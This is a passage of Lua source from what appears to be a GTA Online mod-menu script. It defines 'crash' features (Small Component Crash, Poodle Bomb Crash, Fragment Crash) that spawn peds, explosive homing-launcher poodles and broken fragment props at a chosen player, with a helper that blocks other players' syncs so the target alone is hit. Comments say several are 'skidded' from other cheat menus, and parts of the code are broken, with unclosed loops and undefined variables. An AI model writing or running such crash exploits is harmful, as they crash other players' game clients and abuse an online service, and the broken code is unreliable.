                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("S_M_Y_DWService_01")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("a_m_m_farmer_01")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("s_m_y_construct_01")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("a_m_y_beach_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("s_m_y_garbage")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    ----entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("g_m_y_armgoon_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                ----------------------------------------------------------------------------
                local pedhash = util.joaat("u_m_y_abner")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(50)
                for i = 1, ped_amount do
                    --entities.delete(SpawnedPeds1[i])
                    util.yield(5)
----------------------------------------------------------------------------
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)


menu.toggle_loop(clothescrash, "Small Component Crash", {"scompcrash"}, "Warning! Toggle Panic Mode First!", function(on_toggle)
    --notification("Small Component Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        local math_random = math.random
        local joaat = util.joaat
        util.yield(100)
        local pedhash = util.joaat("player_zero")
        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
            STREAMING.REQUEST_MODEL(pedhash)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
        SpawnedPeds1 = {}
        local ped_amount = math_random(7, 10)
        for i = 1, ped_amount do
            local pedtype = 0
            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
            local coords = PlayerPedCoords
            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
            coords.x = coords.x
            coords.y = coords.y
            coords.z = coords.z
            if loc1 == 1 then
                coords.x = coords.x - math_random(1, 5)
            else
                coords.x = coords.x + math_random(1, 5)
            end
            if loc2 == 1 then
                coords.y = coords.y - math_random(1, 5)
            else
                coords.y = coords.y + math_random(1, 5)
            end
            if loc3 == 1 then
                coords.z = coords.z - math_random(3, 5)
            else
                coords.z = coords.z + math_random(3, 5)
            end
            if pedt == 1 then
                pedtype = 0
            else
                pedtype = 3
            end
            SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
            util.yield(5)
        end
        for i = 1, ped_amount do
            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
            util.yield()
        end
        util.yield(50)
        for i = 1, ped_amount do
            --entities.delete(SpawnedPeds1[i])
            util.yield(5)
            end
    end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local poodlecrash = menu.list(crash, "Poodle Bomb Crash", {}, "")


menu.action(poodlecrash, "Poodle Bomb Crash", {"poodle"}, "Skidded from Jinx.", function()
        local mdl = util.joaat('a_c_poodle')
            BlockSyncs(pid, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1)
        else
                util.toast("Failed to load model. :/")
                --notification("Worth it HAHA!!!", colors.red)
        end
    end)
end)

menu.toggle_loop(poodlecrash, "Poodle Bomb Crash", {"togglepoodle"}, "Skidded from Jinx.", function(on_toggle)
        local mdl = util.joaat('a_c_poodle')
            BlockSyncs(pid, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1)
        else
                util.toast("Failed to load model. :/")
--notification("Worth it HAHA!!!", colors.red)
        end
    end)
end)

    menu.toggle_loop(poodlecrash, "Poodle Crash V2", {"poodlev2"}, "Skidded from Jinx then x6 by Candy.", function(on_loop)
        --notification("Poodle Crash V2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
--Locals
        local mdl = util.joaat('a_c_poodle')
        local mdl1 = util.joaat('a_c_poodle')
        local mdl2 = util.joaat('a_c_poodle')
        BlockSyncs(pid, function()
        if request_model(mdl, mdl1, mdl2, 2) then
                local pos = players.get_position(pid)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped1 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped2 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
---------------------------------------------------------------------------------------------------------------------
--mdl GIVE WEAPON TO PED

                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl1 GIVE WEAPON TO PED

                ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl2 GIVE WEAPON TO PED

                ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl DETACH ENTITY & ADD EXPLOSION

                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(0)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl1 DETACH ENTITY & ADD EXPLOSION

                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped2)
                util.yield(0)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl2 DETACH ENTITY & ADD EXPLOSION

                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped2)
                util.yield(0)
                    end
                end)
            end)
                ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

                local function BlockSyncs(pid, callback)
                for _, i in ipairs(players.list(false, true, true)) do
                    if i ~= pid then
                        local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                        menu.trigger_command(outSync, "on")
                    end
                end
                util.yield(10)
                callback()
                for _, i in ipairs(players.list(false, true, true)) do
                    if i ~= pid then
                        local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                        menu.trigger_command(outSync, "off")
                    end
                end
                end

                local fragcrash = menu.list(crash, "Fragment Crash", {}, "")

                menu.toggle_loop(fragcrash, "Fragment Crash V1", {"togglefragv1"}, "Skidded From 2take1", function(on_toggle)
                if pid ~= players.user() then
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        entities.delete_by_handle(object)
                        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                        util.yield(1000)
                        entities.delete_by_handle(object)
                    end
                end)

                menu.toggle_loop(fragcrash, "Fragment Crash V2", {"togglefragv2"}, "", function(on_toggle)
                    if pid ~= players.user() then
                    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    for i = 0, 100 do 
                        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
